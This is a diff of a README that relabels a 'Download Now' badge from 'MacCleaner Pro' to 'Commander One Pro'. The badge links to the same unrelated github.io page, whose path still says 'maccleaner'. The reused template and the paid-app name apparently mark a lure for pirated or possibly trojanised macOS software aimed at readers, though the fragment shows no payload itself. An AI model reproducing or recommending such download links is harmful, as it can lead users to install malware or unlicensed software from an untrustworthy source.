@@ -6,7 +6,7 @@
 
 # ⬇️ Download Commander One Pro
 
-[![⬇️ Download Now](https://img.shields.io/badge/MacCleaner%20%20Pro-Download%20%20-blue?style=for-the-badge&logo=apple)](https://kiakodkfi3.github.io/.github/maccleaner)
+[![⬇️ Download Now](https://img.shields.io/badge/Commander%20%20One%20%20Pro-Download%20%20-blue?style=for-the-badge&logo=apple)](https://kiakodkfi3.github.io/.github/maccleaner)
 
 ## 📦 How to Install
 
